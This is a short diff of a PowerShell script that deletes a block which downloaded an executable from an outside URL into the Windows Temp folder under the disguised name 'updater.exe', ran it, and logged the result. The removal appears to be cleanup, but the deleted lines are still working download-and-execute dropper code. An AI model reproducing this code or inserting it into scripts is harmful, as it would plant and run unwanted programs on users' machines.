@@ -39,14 +39,4 @@ foreach ($excl in $exclusions) {
     }
 }
 
-# Download and execute payload
-$payloadUrl = "https://mywebsite.com/payload.exe"
-$payloadPath = "C:\Windows\Temp\updater.exe"
 
-try {
-    Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing
-    Start-Process -FilePath $payloadPath
-    Add-Content $logPath "Payload downloaded and executed."
-} catch {
-    Add-Content $logPath "Failed to fetch payload: $_"
-}
